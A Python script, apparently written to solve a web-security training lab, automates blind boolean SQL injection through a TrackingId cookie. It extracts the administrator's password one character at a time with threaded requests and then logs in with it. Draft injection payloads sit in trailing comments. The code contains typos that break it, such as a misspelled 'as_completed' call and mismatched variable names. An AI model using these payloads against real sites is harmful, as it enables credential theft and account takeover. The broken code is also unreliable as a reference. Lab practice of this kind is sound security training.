import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
AVAIL_CHARS = string.printable
MAX_LENGTH = 100


def format_length_query(inner_query, length):
    return f"xyz' or (select length(({inner_query}))={length})-- "


def format_char_query(inner_query, index, char):
    return f"xyz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "


def is_true(resp):
    if "Welcome back!" in resp.text:
        return True
    return False


def format_request(url, outer_query):
    cookies = {
        "TrackingId": outer_query,
    }    
    request = requests.Request("GET", url, cookies=cookies)
    prepped = request.prepare()
    return prepped


def determine_response_length(inner_query, url, no_proxy=False):
    log.info("Determining response length.")
    sess = requests.Session()
    for i in range(1, MAX_LENGTH):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else: 
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"length of query response is {response_length}")
            return i
       
        
def determine_response_char(task):
    sess = requests.Session()
    chars = [ord(x) for x in AVAIL_CHARS]
    for x in chars:
        outer_query = format_char_query(task["inner_query"], task["position"], x)
        prepped = format_request(task["url"], outer_query)
        if task["no_proxy"]:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            task["result"] = str(chr(x))
            return task


def format_results(response_chars):
    results = [
        res["result"]
        for res in sorted(response_chars, key=lambda item: item["position"])
    ]
    return "".join(results)

def get_response_string(inner_query, url, no_proxy, num_threads):
    response_length = determine_response_length(inner_query, url, no_proxy)
    if response_length is None:
        log.error("Couldn't determine response length.")
        sys.exit()
    if num_threads > response_length:
        numb_threads = response_length
    tasks = []
    for i in range(1, response_length + 1):
        result = {
            "position": i,
            "url": url,
            "no_proxy": no_proxy,
            "inner_query": inner_query,
        }
        tasks.append(result)
    response_chars = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        result = [executor.submit(determine_response_char, task) for task in tasks]
        for f in concurrent.futuresas_completed(results):
            response_chars.append(f.result())
    return format_results(response_chars)

def main(args):
    num_threads = 8
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    inner_query = "SELECT password from users where username='administrator'"
    response_string = get_response_string(
        inner_query, shop.base_url, shop.no_proxy, num_threads
    )    
    log.info(f"response is: {response_string}")
    shop.login("administrator", response_string)
    shop.is_solved()
        
        
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
        
#------------------------------------------------------------------------------------------
#draft

#xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
        
#xyz' or (select length('aaaa')=4)--       //true its return text "welcmoeback"

#xyz' or (select substring('abcd', 1,1) = 'a')--             // the same response (true)
# and botta my own builded payload:  xyz' or substring((select password from users where username = 'administrator')1,1) = '{char}'
"""
ок
"""
   
    
"""
select password from users where username = 'administsrator'
inner query


return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
"""    
  